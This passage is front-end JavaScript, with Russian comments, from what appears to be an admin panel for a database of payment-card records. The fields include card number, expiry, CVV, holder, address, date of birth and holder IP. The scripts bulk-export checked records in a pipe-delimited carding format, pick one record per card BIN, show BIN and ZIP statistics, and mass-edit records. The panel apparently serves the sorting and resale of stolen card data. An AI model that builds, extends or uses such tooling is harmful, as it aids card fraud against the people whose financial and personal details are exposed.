					location.reload(); // reload the page to see the new record
				}
			});
		});
		*/
	});

const archiveUrl = '<?php echo ARCHIVE_URL; ?>';
document.getElementById('show-archive').addEventListener('click', function() {
	window.open(archiveUrl, '_blank');
});
</script>

<script>
	const checkboxes = document.querySelectorAll('.record-checkbox');
	const copyButton = document.getElementById('copyButton');

	function updateButton() {
		const checkedCount = Array.from(checkboxes).filter(cb => cb.checked).length;
		if (checkedCount > 0) {
			copyButton.style.display = 'block';
			copyButton.textContent = `Копировать ${checkedCount} шт. отмеченных данных`;
		} else {
			copyButton.style.display = 'none';
		}
	}

	checkboxes.forEach(checkbox => {
		checkbox.addEventListener('change', updateButton);
	});

	document.getElementById('copyButton').addEventListener('click', function() {
		const checkedRows = document.querySelectorAll('input.record-checkbox:checked');
		let dataToCopy = [];

		checkedRows.forEach(checkbox => {
			const row = checkbox.closest('tr');

			// Получаем значения из ячеек
			const info = row.querySelector('td[data-field="info"]').textContent.trim();
			const number = row.querySelector('td[data-field="number"]').textContent.trim();
			const expire = row.querySelector('td[data-field="expire"]').textContent.trim();
			const cvv = row.querySelector('td[data-field="cvv"]').textContent.trim();
			const holder = row.querySelector('td[data-field="holder"]').textContent.trim();
			const zip = row.querySelector('td[data-field="zip"]').textContent.trim();
			const address = row.querySelector('td[data-field="address"]').textContent.trim();
			const city = row.querySelector('td[data-field="city"]').textContent.trim();
			const state = row.querySelector('td[data-field="state"]').textContent.trim();
			const country = row.querySelector('td[data-field="country"]').textContent.trim();
			const phone = row.querySelector('td[data-field="phone"]').textContent.trim();
			const email = row.querySelector('td[data-field="email"]').textContent.trim();
			const dob = row.querySelector('td[data-field="dob"]').textContent.trim();
			const ipholder = row.querySelector('td[data-field="ipholder"]').textContent.trim();

			// Разделяем Info на части
			const infoParts = info.split('\n').map(part => part.trim());
			const brand = infoParts.find(part => part.startsWith('Brand:')) || 'Brand: Не указано';
			const type = infoParts.find(part => part.startsWith('Type:')) || '';
			const level = infoParts.find(part => part.startsWith('Level:')) || '';
			const bank = infoParts.find(part => part.startsWith('Bank:')) || '';

			// Формируем строку с данными
			const rowData = [
				`${brand}; ${type}; ${level}; ${bank}`,
				number || 'null',
				expire || 'null',
				cvv || 'null',
				holder || 'null',
				zip || 'null',
				address || 'null',
				city || 'null',
				state || 'null',
				country || 'null',
				phone || 'null',
				email || 'null',
				dob || 'null',
				ipholder || 'null'
			].filter(value => value).join('|');

			// Добавляем в массив данных для копирования
			dataToCopy.push(rowData);
		});

		// Формируем текст для копирования
		const textToCopy = dataToCopy.join('\n');

		// Копирование в буфер обмена
		navigator.clipboard.writeText(textToCopy).then(() => {
			//alert('Данные скопированы в буфер обмена!');
		}).catch(err => {
			console.error('Ошибка при копировании: ', err);
		});
	});
</script>

<script>
$(document).ready(function() {
    // Выбор всех чекбоксов
    $('#select-all').on('change', function() {
        const isChecked = $(this).is(':checked');
        $('.record-checkbox').prop('checked', isChecked);
    });

    // Обработка нажатия клавиши Enter для редактирования полей
$(document).on('keydown', '.edit', function(event) {
    if (event.keyCode === 13) { // Enter key
        event.preventDefault(); // Предотвращаем стандартное поведение
        event.stopPropagation(); // Останавливаем дальнейшую обработку события
		
		$(this).removeAttr('contenteditable');
		$(this).blur();

        // Ваш код остается без изменений
        const id = $(this).attr('data-id');
        const field = $(this).attr('data-field');
        const value = $(this).text();

        if (field === 'comments' || field === 'info' || field === 'number' || field === 'expire' || field === 'cvv' || field === 'holder' || field === 'zip' || field === 'address' || field === 'city' || field === 'state' || field === 'country' || field === 'phone' || field === 'email' || field === 'dob' || field === 'ipholder' || field === 'bin' || field === 'ccdate') {
            const ids = [];
            const values = {};

            $('.record-checkbox:checked').each(function() {
                const recordId = $(this).closest('tr').find('.record-checkbox').val();
                ids.push(recordId);
                values[recordId] = value; // Здесь определяется, какое значение обновлять для каждого поля
            });

            if (ids.length > 0) {
                // Сохранение состояния чекбоксов
                const checkboxStates = {};
                $('.record-checkbox').each(function() {
                    const recordId = $(this).val();
                    checkboxStates[recordId] = $(this).is(':checked');
                });

                // AJAX-запрос для массового обновления
                $.ajax({
                    url: 'update_records.php',
                    type: 'POST',
                    data: { ids: ids, field: field, values: values },
                    success: function(response) {
                        console.log(response); // Отладочная информация
                        // Обновление значений на странице
                        ids.forEach(function(recordId) {
                            // Находим ячейку, которую нужно обновить
                            const $cell = $(`tr:has(.record-checkbox[value='${recordId}']) .edit[data-field='${field}']`);
                            $cell.text(values[recordId]); // Обновляем текст ячейки

                            // Восстанавливаем состояние чекбокса
                            const $checkbox = $(`tr:has(.record-checkbox[value='${recordId}']) .record-checkbox`);
                            $checkbox.prop('checked', checkboxStates[recordId]);
                        });
                    },
                    error: function(jqXHR, textStatus, errorThrown) {
                        console.error(textStatus, errorThrown); // Отладочная информация
                        alert('Ошибка при обновлении записей.');
                    }
                });
            } else {
                alert("Пожалуйста, выберите хотя бы одну запись.");
            }
        }
    }
});


    // Сделать поле редактируемым
    $(document).on('dblclick', '.edit', function() {
        $(this).attr('contentEditable', true).focus();
    });

    // Убираем редактирование, когда элемент теряет фокус
    $(document).on('blur', '.edit', function() {
        $(this).attr('contentEditable', false);
    });
});
</script>

<script>
document.getElementById('select-first-per-bin').addEventListener('click', function() {
    const selectedBins = new Set();
    const rows = document.querySelectorAll('tbody tr');

    rows.forEach(function(row) {
        const checkbox = row.querySelector('.record-checkbox');
        const binElement = row.querySelector('[data-bin]');

        // Проверяем, существует ли элемент с атрибутом data-bin
        if (binElement) {
            const bin = binElement.getAttribute('data-bin');

            if (!selectedBins.has(bin)) {
                checkbox.checked = true; // Отмечаем чекбокс
                selectedBins.add(bin); // Добавляем BIN в набор
				updateButton();
            } else {
                checkbox.checked = false; // Снимаем отметку
            }
        }
    });
});
</script>

<script>
    let currentIndex = 0; // Индекс для отслеживания текущей позиции

    document.getElementById('select-ten-records').addEventListener('click', function() {
        const checkboxes = document.querySelectorAll('.record-checkbox');
        const totalCheckboxes = checkboxes.length;

        // Отметить следующие 10 чекбоксов
        for (let i = currentIndex; i < currentIndex + 10 && i < totalCheckboxes; i++) {
            checkboxes[i].checked = true;
			updateButton();
        }

        // Обновить индекс
        currentIndex += 10;

        // Если все чекбоксы отмечены, отключить кнопку
        if (currentIndex >= totalCheckboxes) {
            this.disabled = true; // Отключение кнопки
        }
    });
</script>

<script>
    // Выделение всей таблицы по двойному клику
    document.getElementById('binTable').addEventListener('dblclick', function() {
        const table = document.getElementById('binStatsTable');
        const range = document.createRange();
        range.selectNode(table);
        window.getSelection().removeAllRanges(); // Удаляет текущий выбор
        window.getSelection().addRange(range); // Выбирает таблицу
    });

    // Выделение строки при одиночном клике
    const rows = document.querySelectorAll('#binStatsTable tbody tr');
    rows.forEach(row => {
        row.addEventListener('click', function(event) {
            const selected = this.classList.toggle('selected');
            if (selected) {
                this.style.backgroundColor = '#d1e7dd'; // Цвет выделенной строки
            } else {
                this.style.backgroundColor = ''; // Сброс цвета
            }
        });
    });
</script>

<style>
    #binStatsTable {
        cursor: pointer; /* Указывает, что таблица кликабельна */
    }
    #binStatsTable tr:hover {
        background-color: #f1f1f1; /* Подсветка строки при наведении */
    }
    .selected {
        background-color: #d1e7dd; /* Цвет выделенной строки */
    }
</style>
<script>
    // Выделение всей таблицы по двойному клику
    document.getElementById('filteredBinStatsTable').addEventListener('dblclick', function() {
        const filteredTable = document.getElementById('filteredBinStatsTable');
        const rangeFiltered = document.createRange();
        rangeFiltered.selectNode(filteredTable);
        window.getSelection().removeAllRanges(); // Удаляет текущий выбор
        window.getSelection().addRange(rangeFiltered); // Выбирает таблицу
    });

    // Выделение строки при одиночном клике
    const rowsFiltered = document.querySelectorAll('#filteredBinStatsTable tbody tr');
    rowsFiltered.forEach(rowFiltered => {
        rowFiltered.addEventListener('click', function(event) {
            const selectedFiltered = this.classList.toggle('selected');
            if (selectedFiltered) {
                this.style.backgroundColor = '#d1e7dd'; // Цвет выделенной строки
            } else {
                this.style.backgroundColor = ''; // Сброс цвета
            }
        });
    });
</script>
<style>
    #filteredBinStatsTable {
        cursor: pointer; /* Указывает, что таблица кликабельна */
    }
    #filteredBinStatsTable tr:hover {
        background-color: #f1f1f1; /* Подсветка строки при наведении */
    }
    .selected {
        background-color: #d1e7dd; /* Цвет выделенной строки */
    }
</style>

<script>
    // Выделение всей таблицы по двойному клику
    document.getElementById('zipTable').addEventListener('dblclick', function() {
        const table = document.getElementById('zipStatsTable');
        const range = document.createRange();
        range.selectNode(table);
        window.getSelection().removeAllRanges(); // Удаляет текущий выбор
        window.getSelection().addRange(range); // Выбирает таблицу
    });

    // Выделение строки при одиночном клике
    const rows = document.querySelectorAll('#zipStatsTable tbody tr');
    rows.forEach(row => {
        row.addEventListener('click', function(event) {
            const selected = this.classList.toggle('selected');
            if (selected) {
                this.style.backgroundColor = '#d1e7dd'; // Цвет выделенной строки
            } else {
                this.style.backgroundColor = ''; // Сброс цвета
            }
        });
    });
</script>

<style>
    #zipStatsTable {
        cursor: pointer; /* Указывает, что таблица кликабельна */
    }
    #zipStatsTable tr:hover {
        background-color: #f1f1f1; /* Подсветка строки при наведении */
    }
    .selected {
        background-color: #d1e7dd; /* Цвет выделенной строки */
    }
</style>
<script>
    // Выделение всей таблицы по двойному клику
    document.getElementById('filteredZipStatsTable').addEventListener('dblclick', function() {
        const filteredTable = document.getElementById('filteredZipStatsTable');
        const rangeFiltered = document.createRange();
        rangeFiltered.selectNode(filteredTable);
        window.getSelection().removeAllRanges(); // Удаляет текущий выбор
        window.getSelection().addRange(rangeFiltered); // Выбирает таблицу
    });

    // Выделение строки при одиночном клике
    const rowsFiltered = document.querySelectorAll('#filteredZipStatsTable tbody tr');
    rowsFiltered.forEach(rowFiltered => {
        rowFiltered.addEventListener('click', function(event) {
            const selectedFiltered = this.classList.toggle('selected');
            if (selectedFiltered) {
                this.style.backgroundColor = '#d1e7dd'; // Цвет выделенной строки
            } else {
                this.style.backgroundColor = ''; // Сброс цвета
            }
        });
    });
</script>
<style>
    #filteredZipStatsTable {
        cursor: pointer; /* Указывает, что таблица кликабельна */
    }
    #filteredZipStatsTable tr:hover {
        background-color: #f1f1f1; /* Подсветка строки при наведении */
    }
    .selected {
        background-color: #d1e7dd; /* Цвет выделенной строки */
    }
</style>